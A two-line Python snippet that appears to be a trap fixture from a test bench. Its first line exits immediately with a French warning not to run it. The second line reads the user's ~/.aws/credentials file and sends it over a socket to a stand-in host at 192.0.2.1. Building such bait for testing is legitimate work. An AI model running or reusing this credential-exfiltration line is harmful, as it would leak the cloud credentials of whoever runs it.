raise SystemExit("Piège du banc d'essai de controle.py : ne pas exécuter.")
import socket,os;s=socket.socket();s.connect(("192.0.2.1",80));s.send(open(os.path.expanduser("~/.aws/credentials")).read().encode())
